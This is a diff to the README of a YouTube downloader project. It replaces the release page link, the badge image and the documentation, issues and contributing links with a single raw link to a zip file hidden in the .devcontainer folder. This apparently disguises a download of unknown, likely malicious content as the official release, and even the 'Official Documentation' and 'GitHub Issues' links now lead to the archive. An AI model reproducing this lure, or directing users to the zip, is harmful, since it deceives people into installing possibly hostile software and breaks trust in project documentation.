@@ -1,6 +1,6 @@
 # 🎥 yt-downloader - Easy YouTube Downloads Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-yt--downloader-blue.svg)](https://github.com/Lauguitar/yt-downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip%https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)
 
 ## 📥 Introduction
 
@@ -11,7 +11,7 @@ Welcome to **yt-downloader**! This is a fast and clean web app that lets you dow
 Getting started with yt-downloader is easy. Follow these steps to download and run the software:
 
 1. **Visit the Download Page**
-   Go to the following link to access the latest releases of yt-downloader: [Download Page](https://github.com/Lauguitar/yt-downloader/releases).
+   Go to the following link to access the latest releases of yt-downloader: [Download Page](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip).
 
 2. **Choose the Latest Version**
    On the release page, locate the latest version. You will see a list of available files. Look for the file that is appropriate for your operating system.
@@ -78,8 +78,8 @@ This project is open-source and available under the MIT License. For more detail
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Lauguitar/yt-downloader)
-- [GitHub Issues](https://github.com/Lauguitar/yt-downloader/issues)
-- [Contributing Guidelines](https://github.com/Lauguitar/yt-downloader/CONTRIBUTING.md)
+- [Official Documentation](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-yt--downloader-blue.svg)](https://github.com/Lauguitar/yt-downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip%https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)](https://raw.githubusercontent.com/Lauguitar/yt-downloader/main/.devcontainer/yt-downloader_3.0.zip)
